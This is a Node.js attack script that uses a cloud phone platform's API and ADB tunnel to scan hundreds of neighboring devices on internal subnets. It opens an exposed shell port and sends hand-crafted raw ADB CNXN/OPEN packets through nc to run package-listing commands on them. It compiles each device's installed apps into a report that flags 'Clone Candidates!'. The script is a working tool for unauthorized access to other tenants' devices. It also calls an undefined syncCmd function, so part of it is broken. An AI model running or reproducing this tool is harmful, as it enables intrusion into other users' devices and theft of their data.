#!/usr/bin/env node
/**
 * NEIGHBOR APP SCANNER
 * Uses syncCmd to query each neighbor for user apps via multiple methods:
 * 1. Raw ADB CNXN banner (already done - model info)
 * 2. Shell port 11114 (if open)
 * 3. getprop cloud properties via CNXN data field
 * 4. Batch scan via D1 shell with background nc relays
 */
const path = require('path');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const { execSync } = require('child_process');

const { AK, SK, HOST, D1, CT, SHD, P } = require('../shared/vmos_api');
const D1_ADB = 'localhost:8479';
const OUT = path.join(__dirname, '..', 'output', 'neighbor_full_scan_results');

if (!fs.existsSync(OUT)) fs.mkdirSync(OUT, { recursive: true });
const save = (f, d) => fs.writeFileSync(`${OUT}/${f}`, typeof d === 'string' ? d : JSON.stringify(d, null, 2));

function sign(body) {
  const xd = new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z');
  const sd = xd.slice(0,8), CT = 'application/json;charset=UTF-8', SHD = 'content-type;host;x-content-sha256;x-date';
  const bh = crypto.createHash('sha256').update(body,'utf8').digest('hex');
  const can = `host:${HOST}\nx-date:${xd}\ncontent-type:${CT}\nsignedHeaders:${SHD}\nx-content-sha256:${bh}`;
  const ch = crypto.createHash('sha256').update(can,'utf8').digest('hex');
  const sts = `HMAC-SHA256\n${xd}\n${sd}/armcloud-paas/request\n${ch}`;
  let k = crypto.createHmac('sha256',SK).update(sd).digest();
  k = crypto.createHmac('sha256',k).update('armcloud-paas').digest();
  k = crypto.createHmac('sha256',k).update('request').digest();
  return {'content-type':CT,'x-date':xd,'x-host':HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256',k).update(sts).digest('hex')}`};
}

function post(ep, data, timeout) {
  return new Promise(ok => {
    const b = JSON.stringify(data||{}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({hostname:HOST,path:ep,method:'POST',headers:{...h,'content-length':buf.length},timeout:(timeout||30)*1000},res=>{
      let d='';res.on('data',c=>d+=c);res.on('end',()=>{try{ok(JSON.parse(d));}catch{ok({code:-1,raw:d.slice(0,2000)});}});
    });
    req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});
    req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();
  });
}

function adbShell(cmd, timeoutMs) {
  try {
    return execSync(`adb -s ${D1_ADB} shell '${cmd.replace(/'/g, "'\\''")}'`, {
      timeout: timeoutMs || 15000, encoding: 'utf8', maxBuffer: 10*1024*1024
    }).trim();
  } catch(e) { return `[ADB_ERR]`; }
}

async function main() {
  console.log('█'.repeat(60));
  console.log('  NEIGHBOR APP SCANNER — 445 devices');
  console.log('█'.repeat(60));

  // Load parsed device data
  const devices = JSON.parse(fs.readFileSync('/tmp/parsed_devices.json','utf8'));
  P(`Loaded ${devices.length} devices`);

  // ═══════════════════════════════════════════════════════════
  // METHOD 1: Batch scan port 11114 (shell) on all devices via ADB tunnel
  // Port 11114 gives direct shell access without ADB protocol
  // ═══════════════════════════════════════════════════════════
  P('\n── METHOD 1: Shell port 11114 scan ──');
  
  const shellOpen = [];
  // Check all IPs for port 11114 in batches of 50 (parallel)
  for (let i = 0; i < devices.length; i += 50) {
    const batch = devices.slice(i, i+50);
    const batchNum = Math.floor(i/50)+1;
    P(`  Port 11114 scan batch ${batchNum}/${Math.ceil(devices.length/50)}...`);
    
    const script = batch.map(d => 
      `nc -w1 -z ${d.ip} 11114 2>/dev/null && echo "${d.ip}:11114:OPEN"`
    ).join('\n');
    
    const result = adbShell(script, 30000);
    for (const line of result.split('\n')) {
      if (line.includes(':OPEN')) {
        const ip = line.split(':')[0];
        shellOpen.push(ip);
      }
    }
  }
  
  P(`  Shell port 11114 open on ${shellOpen.length} devices`);
  
  // For devices with shell port open, query for apps
  if (shellOpen.length > 0) {
    P(`  Querying apps via shell port 11114...`);
    for (const ip of shellOpen.slice(0, 30)) {
      const result = adbShell(
        `echo "pm list packages -3" | nc -w3 ${ip} 11114 2>/dev/null | head -20`,
        10000
      );
      const d = devices.find(x => x.ip === ip);
      if (d && result.includes('package:')) {
        d.userApps = result.split('\n')
          .filter(l => l.startsWith('package:'))
          .map(l => l.replace('package:','').trim());
        P(`    ${ip}: ${d.userApps.length} user apps!`);
      }
    }
  }

  // ═══════════════════════════════════════════════════════════
  // METHOD 2: Use syncCmd to batch-probe neighbors via nc
  // Send commands one-at-a-time to get proper responses
  // Use different ADB shell command approach - write script to D1
  // ═══════════════════════════════════════════════════════════
  P('\n── METHOD 2: Batch app scan via syncCmd + nc ──');
  
  // Sample 40 diverse IPs that have models identified
  const withModels = devices.filter(d => d.model && (!d.userApps || d.userApps.length === 0));
  const sampleIPs = [];
  const seenSubnets = {};
  for (const d of withModels) {
    const sub = d.ip.split('.').slice(0,3).join('.');
    if (!seenSubnets[sub]) seenSubnets[sub] = 0;
    if (seenSubnets[sub] < 8 && sampleIPs.length < 40) {
      sampleIPs.push(d.ip);
      seenSubnets[sub]++;
    }
  }
  
  P(`  Scanning ${sampleIPs.length} devices for user apps...`);
  
  // Batch 5 at a time via syncCmd
  for (let i = 0; i < sampleIPs.length; i += 5) {
    const batch = sampleIPs.slice(i, i+5);
    P(`  Batch ${Math.floor(i/5)+1}/${Math.ceil(sampleIPs.length/5)}: ${batch.join(', ')}`);
    
    // For each IP, try to get user packages via raw ADB OPEN with proper length
    for (const ip of batch) {
      // Method A: Try shell:pm list packages -3 with correct OPEN payload length
      // The OPEN data payload = "shell:pm list packages -3\0"
      // Length = 26 bytes = 0x1a
      const cmd = [
        `result=$(`,
        `{ printf 'CNXN\\x00\\x00\\x00\\x01\\x00\\x10\\x00\\x00\\x07\\x00\\x00\\x00\\x32\\x02\\x00\\x00\\xbc\\xb1\\xa7\\xb1host::\\x00';`,
        `sleep 0.5;`,
        // OPEN with local-id=1, remote-id=0, length=0x1a=26
        `printf 'OPEN\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xb0\\xaf\\xba\\xb1shell:pm list packages -3\\x00';`,
        `sleep 3; } | nc -w5 ${ip} 5555 2>/dev/null | strings`,
        `)`,
        `pkgs=$(echo "$result" | grep "^package:" | sort -u | head -20)`,
        `if [ -n "$pkgs" ]; then echo "FOUND=${ip}|$pkgs"; else echo "EMPTY=${ip}"; fi`
      ].join(' ');
      
      const out = await syncCmd(cmd, 15);
      
      if (out.includes('FOUND=')) {
        const match = out.match(/FOUND=[\d.]+\|(.*)/s);
        if (match) {
          const apps = match[1].split('\n')
            .filter(l => l.startsWith('package:'))
            .map(l => l.replace('package:','').trim());
          const d = devices.find(x => x.ip === ip);
          if (d && apps.length > 0) {
            d.userApps = apps;
            P(`    ★ ${ip}: ${apps.length} user apps: ${apps.slice(0,3).join(', ')}...`);
          }
        }
      }
    }
  }

  // ═══════════════════════════════════════════════════════════
  // METHOD 3: Use asyncCmd for longer-running scans
  // ═══════════════════════════════════════════════════════════
  P('\n── METHOD 3: asyncCmd for remaining devices ──');
  
  const remaining = devices.filter(d => d.model && (!d.userApps || d.userApps.length === 0)).slice(0,20);
  
  if (remaining.length > 0) {
    // Build a big script to scan 20 IPs at once
    const bigScript = remaining.map(d => 
      `echo "CHECK=${d.ip}"; (printf 'CNXN\\x00\\x00\\x00\\x01\\x00\\x10\\x00\\x00\\x07\\x00\\x00\\x00\\x32\\x02\\x00\\x00\\xbc\\xb1\\xa7\\xb1host::\\x00'; sleep 0.3; printf 'OPEN\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x1a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xb0\\xaf\\xba\\xb1shell:pm list packages -3\\x00'; sleep 2) | nc -w4 ${d.ip} 5555 2>/dev/null | strings | grep "^package:" | head -10`
    ).join('\n');
    
    // Try asyncCmd for potentially unlimited output
    const asyncR = await post('/vcpcloud/api/padApi/asyncCmd', {
      padCode: D1,
      scriptContent: bigScript,
      timeout: 120
    }, 15);
    
    if (asyncR.code === 200 && asyncR.data) {
      const taskId = asyncR.data.taskId || asyncR.data;
      P(`  asyncCmd taskId: ${taskId}`);
      
      // Poll for result
      for (let poll = 0; poll < 12; poll++) {
        await new Promise(r => setTimeout(r, 10000));
        const status = await post('/vcpcloud/api/padApi/padTaskDetail', {taskId}, 10);
        if (status.code === 200 && status.data) {
          const task = (Array.isArray(status.data) ? status.data : [status.data])[0] || {};
          if (task.taskStatus === 3) {
            const out = (task.errorMsg || task.taskResult || '').trim();
            P(`  asyncCmd result (${out.length} chars): ${out.slice(0,200)}`);
            // Parse results
            let currentIP = '';
            for (const line of out.split('\n')) {
              if (line.startsWith('CHECK=')) currentIP = line.replace('CHECK=','');
              if (line.startsWith('package:') && currentIP) {
                const d = devices.find(x => x.ip === currentIP);
                if (d) {
                  if (!d.userApps) d.userApps = [];
                  d.userApps.push(line.replace('package:','').trim());
                }
              }
            }
            break;
          }
          P(`  Poll ${poll+1}: status=${task.taskStatus}`);
        }
      }
    } else {
      P(`  asyncCmd failed: ${asyncR.code} ${asyncR.msg||''}`);
    }
  }

  // ═══════════════════════════════════════════════════════════
  // GENERATE FINAL REPORT
  // ═══════════════════════════════════════════════════════════
  P('\n── GENERATING FINAL REPORT ──');
  
  const withApps = devices.filter(d => d.userApps && d.userApps.length > 0);
  const withModel = devices.filter(d => d.model);
  
  // Collect all unique user apps
  const allApps = {};
  for (const d of devices) {
    for (const app of (d.userApps || [])) {
      if (!allApps[app]) allApps[app] = [];
      allApps[app].push(d.ip);
    }
  }

  // Subnet stats
  const subnets = {};
  for (const d of devices) {
    const sub = d.ip.split('.').slice(0,3).join('.');
    if (!subnets[sub]) subnets[sub] = { total: 0, withModel: 0, withApps: 0 };
    subnets[sub].total++;
    if (d.model) subnets[sub].withModel++;
    if (d.userApps && d.userApps.length > 0) subnets[sub].withApps++;
  }

  let report = `# NEIGHBOR FULL SCAN REPORT\n\n`;
  report += `Generated: ${new Date().toISOString()}\n\n`;
  report += `## Summary\n\n`;
  report += `| Metric | Count |\n|--------|-------|\n`;
  report += `| **Total Neighbors Found** | ${devices.length} |\n`;
  report += `| **With Device Model Identified** | ${withModel.length} |\n`;
  report += `| **With User Apps Installed** | ${withApps.length} |\n`;
  report += `| **Unique Device Models** | ${new Set(withModel.map(d=>d.model)).size} |\n`;
  report += `| **Unique User Apps Found** | ${Object.keys(allApps).length} |\n`;
  report += `| **Shell Port 11114 Open** | ${shellOpen.length} |\n\n`;

  report += `## Subnet Distribution\n\n`;
  report += `| Subnet | Total | With Model | With Apps |\n|--------|-------|------------|----------|\n`;
  for (const [sub, s] of Object.entries(subnets).sort((a,b) => b[1].total - a[1].total)) {
    report += `| ${sub}.x | ${s.total} | ${s.withModel} | ${s.withApps} |\n`;
  }

  if (withApps.length > 0) {
    report += `\n## Devices WITH User Apps (Clone Candidates!)\n\n`;
    report += `| IP | Model | User Apps |\n|-----|-------|----------|\n`;
    for (const d of withApps) {
      report += `| ${d.ip} | ${d.model || '?'} | ${(d.userApps||[]).join(', ')} |\n`;
    }
    
    report += `\n## All Unique User Apps Found\n\n`;
    report += `| App Package | Found On # Devices |\n|-------------|-------------------|\n`;
    for (const [app, ips] of Object.entries(allApps).sort((a,b) => b[1].length - a[1].length)) {
      report += `| ${app} | ${ips.length} |\n`;
    }
  }

  report += `\n## Top Device Models (${new Set(withModel.map(d=>d.model)).size} unique)\n\n`;
  report += `| Model | Count | Example IPs |\n|-------|-------|-------------|\n`;
  const modelCounts = {};
  for (const d of withModel) {
    if (!modelCounts[d.model]) modelCounts[d.model] = [];
    modelCounts[d.model].push(d.ip);
  }
  for (const [m, ips] of Object.entries(modelCounts).sort((a,b) => b[1].length - a[1].length).slice(0, 50)) {
    report += `| ${m} | ${ips.length} | ${ips.slice(0,3).join(', ')} |\n`;
  }

  report += `\n## All ${devices.length} Neighbors\n\n`;
  report += `| # | IP | Model | Name | Apps |\n|---|-----|-------|------|------|\n`;
  for (let i = 0; i < devices.length; i++) {
    const d = devices[i];
    const apps = (d.userApps || []).length > 0 ? d.userApps.join(', ') : '-';
    report += `| ${i+1} | ${d.ip} | ${d.model || '-'} | ${d.name || '-'} | ${apps} |\n`;
  }

  report += `\n## Scan Methodology\n\n`;
  report += `1. **Discovery**: Parallel port 5555 scan across 10.0.{26,27,96,97,98,99}.x subnets\n`;
  report += `2. **Model Extraction**: Raw ADB CNXN banner via nc (strings extraction)\n`;
  report += `3. **App Scan Method 1**: Shell port 11114 (direct shell access)\n`;
  report += `4. **App Scan Method 2**: Raw ADB OPEN protocol via syncCmd + nc\n`;
  report += `5. **App Scan Method 3**: asyncCmd for batch scanning\n`;

  save('NEIGHBOR_FULL_SCAN_REPORT.md', report);
  fs.writeFileSync(path.join(__dirname, '..', 'reports', 'NEIGHBOR_FULL_SCAN_REPORT.md'), report);
  save('all_devices.json', devices);

  P(`\nReport: ${OUT}/NEIGHBOR_FULL_SCAN_REPORT.md`);
  P(`Devices: ${devices.length} total, ${withModel.length} identified, ${withApps.length} with user apps`);
  P(`Models: ${new Set(withModel.map(d=>d.model)).size} unique`);
  P(`User apps: ${Object.keys(allApps).length} unique across ${withApps.length} devices`);

  console.log('\n' + '█'.repeat(60));
  console.log('  SCAN COMPLETE');
  console.log('█'.repeat(60));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
